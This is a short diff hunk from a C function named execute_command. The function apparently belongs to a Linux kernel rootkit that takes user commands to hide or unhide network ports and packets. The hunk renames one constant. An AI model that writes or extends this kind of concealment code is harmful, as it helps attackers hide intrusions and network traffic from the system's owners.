@@ -1392,9 +1392,9 @@ int execute_command(const char __user *str, size_t length)
         str += sizeof(CFG_UNHIDE_UDP6_PORT);
         unhide_udp6_port(str);
 	    
-    } else if (strcmp(str, CFG_HIDE_TCP4_PACKET) == 0) {
+    } else if (strcmp(str, CFG_HIDE_TCP_PACKET) == 0) {
         pr_info("Got hide tcp4 packet command\n");
-        str += sizeof(CFG_HIDE_TCP4_PACKET);
+        str += sizeof(CFG_HIDE_TCP_PACKET);
 	hide_tcp4_packet(str);
     } else if (strcmp(str, CFG_UNHIDE_TCP4_PACKET) == 0) {
         pr_info("Got unhide tcp4 packet command\n");
